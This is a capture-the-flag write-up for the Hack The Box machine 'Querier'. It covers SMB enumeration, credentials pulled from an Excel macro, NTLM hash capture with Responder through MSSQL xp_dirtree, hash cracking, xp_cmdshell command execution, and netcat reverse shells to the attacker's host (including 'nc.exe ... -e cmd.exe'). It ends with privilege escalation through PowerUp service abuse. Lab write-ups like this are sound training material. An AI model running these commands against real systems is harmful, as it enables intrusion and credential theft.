# Querier

## User

### Scan
The usual scan only turns up filtered ports on this box, so the parameters of our initial scan need to be widened by increasing the port range. `nmap -sC -sV -p- 10.10.10.125`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-23 03:35 GMT
Nmap scan report for 10.10.10.125
Host is up (0.089s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server  14.00.1000.00
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2019-04-22T13:28:42
|_Not valid after:  2049-04-22T13:28:42
|_ssl-date: 2019-04-23T02:38:15+00:00; -1h00m11s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1h00m11s, deviation: 0s, median: -1h00m11s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-04-23 02:38:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.87 seconds

```
### SMB File
There is a lot to take in here, so let's start by enumerating SMB. To get the list of shares we can try `echo exit | smbclient -L \\10.10.10.125`:
```
Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```
Reports is the only share name that doesn't look liek a default so maybe we can access it without authenticating. 
```
smbclient \\\\10.10.10.125\\Reports
```

### Stegonagraphy
We can! Download that file with `get "Currency Volume Report.xlsm`. `xxd` on this file shows that there are many files nested inside. To extract them, use `binwalk -e FILENAME`. The extracted files will be placed into a new directory. After looking through the files, `xl/vbaProject.bin` pops out because it has a Uid and Pwd field. These credentials might let us access the MSSQL server.
```
Uid=reporting;Pwd=PcwTWTHRwryjc$c6
```
[Impacket](https://github.com/SecureAuthCorp/impacket) has some very cool modules for interacting with Microsoft services. I used `mssqlclient.py` to login to the server. Notice that Windows Auth is being used and the `$` character is escaped.
```
./mssqlclient.py -windows-auth reporting:PcwTWTHRwryjc\$c6@10.10.10.125
```

### NTLM Hash Intercept
Now we're in. `help` will give us some starting commands, but nothing seems to work. I went to a few different cheat sheet sites for MSSSQL things to try and found that this works:
```
declare @q varchar(200); set @q='\\10.10.XX.XX\Test'; exec master.dbo.xp_dirtree @q;
``` 
`nc -lnvp 445` on the attacking machine before running the above command shows that the server is trying to connect to us. We can exploit this connection with a tool called `responder`. It will try to capture the NTLM hash from the server when it attempts to connect to our machine. `responder -I tun0`, then run the SQL command.
```
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:dbbd75ac60c43c5e:5A169016061AB827B7CD54BF44B113AC:0101000000000000C0653150DE09D20171026240A3CFEB40000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000000977FD38F9865D323C306ADFFEB9335ABE1CE022CF089EC6EEB7DEEAD35F389F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000
```
Now we can use a tool like Hashcat to crack it. `hashcat -m 5600 mssql-svc.hash /usr/shar/wordlists/rockyou.txt -o hashcat.out` will give us the password for the `mssql-svc` user.

NOTE: Hashcat should be run on a host OS, not a VM for the best performance. If your host OS is having trouble cracking this with Hashcat, you may need to add the `-D 1` option to ensure that it is not a hardware issue. My host OS is MacOS and required this option to work correctly.

### xp_cmdshell
 `./mssqlclient.py -windows-auth mssql-svc:corporate568@10.10.10.125` to get into the new user. To be able to run commands, we need to run `enable_xp_cmdshell` and then `reconfigure`. Now we can start to poke around. `exec master.dbo.xp_cmdshell 'dir c:\Users\Public\Desktop' should show a `user.txt` file, but it appears we don't have access to it.

It turns out that sysadmin `xp_cmdshell` users run commands as a service account and has limited permissions. To run a command as another user and get `user.txt`:
```
execute as login = 'Querier\mssql-svc'; exec master..xp_cmdshell 'type c:\U
sers\mssql-svc\Desktop\user.txt'
```

And it appears!
```
c37b41bb669da345bb14de50faab3c16
```

## Root

### Getting a Shell
Now that we are able to execute commands as a user, we have a lot more oppportunity to weasel our way into a better position on the system. This configuration for `xp_cmdshell` turns off access frequently and it requires a lot of commands that I am unfamiliar with. To get a more comfortable position, we need a few files. 

[mssql_shell.py](raw.githubusercontent.com/Alamot/code-snippets/master/mssql/mssql_shell.py) is a fantastic tool to abstract the whole `xp_cmdshell` process. It will automatically enable `xp_cmdshell` and work like a basic shell and includes an upload feature! Unfortunately, `xp_cmdshell` gets turned off frequently using this method. To use it, edit the python script and change `MSSQL_SERVER`, `MSSQL_USERNAME`, and `MSSQL_PASSWORD` using the mssql-svc credentials. Then simply run the script.

We can use the upload feature in mssql_shell.py to upload the Windows version of [netcat](https://joncraton.org/files/nc111nt.zip). Unzip and get `nc.exe` in your local folder, then run `python mssql_shell.py`, then type `upload nc.exe`. Next, on your local machine you can run `nc -nlvp 2222`. In the mssql shell run `nc.exe 10.10.XX.XX 2222 -e cmd.exe'. Your machine should pop up with a shell that will stay up even when the mssql shell can no longer execute commands.

### PowerUp
Now we start the enumeration process. I followed a few different enumeration cheat sheets, but the one that worked the best was [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc). Download PowerUp.ps1 and upload it using the mssql shell. Once it is on the machine, we can use our netcat shell to run import it into Powershell. `powershell.exe -nop -exec bypass`

```
PS > Import-Module C:\Path\To\PowerUp.ps1
PS > Invoke-AllChecks | Out-File -Encoding ASCII C:\Path\To\output.txt
```
This will enumerate the system and look for vulnerable places where we might be able to escalate our privileges. The output of this tool shows us something very interesting:

```
ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -ServiceName 'UsoSvc'
```
It seems as if this service is unprotected. The default Service Abuse command will create a new user with Admin privileges, but let's cut right to the chase and open up a netcat shell as Admin. Run 'nc -lvnp 8081' to start a new netcat listener on a different port and exploit with:
```
PS > Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "C:\Users\mssql-svc\Documents\nc.exe 10.10.XX.XX 8081 -e cmd.exe
```

This shell does not stay active for very long, so be quick about establishing another persistent shell or getting `root.txt`. I used `type C:\Users\Administrator\Desktop\root.txt` to print out the hash:
```
b19c3794f786a1fdcf205f81497c3592
```
